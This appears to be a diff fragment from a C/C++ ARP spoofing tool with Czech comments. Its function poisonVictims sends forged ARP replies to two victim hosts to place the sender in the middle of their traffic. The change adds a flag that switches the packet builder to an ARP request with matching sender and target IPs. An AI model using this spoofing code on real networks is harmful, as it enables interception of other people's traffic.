@@ -751,9 +751,9 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			
 		if(arp){
 			// Zasílání ARP paketů oběma obětem
-			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device);
+			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device,false);
 			cerr<<"Odeslán první ARP"<<endl;
-			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device);			
+			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device,false);			
 			cerr<<"Odeslán druhý ARP"<<endl;
 		}
 		else{
@@ -835,7 +835,8 @@ void sendPacketARP(u_char* srcMac,
 				char* dstMac,
 				char* dstIp,
 				int socket,
-				struct sockaddr_ll device)
+				struct sockaddr_ll device,
+				bool reverse)
 {
 	ARP_HEADER arphdr;
 	int bytes;
@@ -855,12 +856,22 @@ void sendPacketARP(u_char* srcMac,
 	arphdr.ptype = htons (ETH_P_IP);
 	arphdr.hlen = ETH_ADDR_LEN;
 	arphdr.plen = IP_ADDR_LEN;
-	arphdr.oper = htons (ARP_REPLY);
+	
 	// Zdrojová adresa - moje
 	memcpy (&arphdr.sha, srcMac, ETH_ADDR_LEN * sizeof (uint8_t));
-	// Nakopírování ip adres
-	inet_pton(AF_INET, srcIp,&arphdr.spa);
-	inet_pton(AF_INET, dstIp,&arphdr.tpa);
+	if(reverse)
+	{
+		arphdr.oper = htons (ARP_REQUEST);
+		inet_pton(AF_INET, srcIp,&arphdr.spa);
+		inet_pton(AF_INET, srcIp,&arphdr.tpa);		
+	}
+	else
+	{
+		arphdr.oper = htons (ARP_REPLY);
+		// Nakopírování ip adres
+		inet_pton(AF_INET, srcIp,&arphdr.spa);
+		inet_pton(AF_INET, dstIp,&arphdr.tpa);
+	}
 
 	// Délka paketu
 	datalen = ETH_HDRLEN + ARP_HDR_LEN;
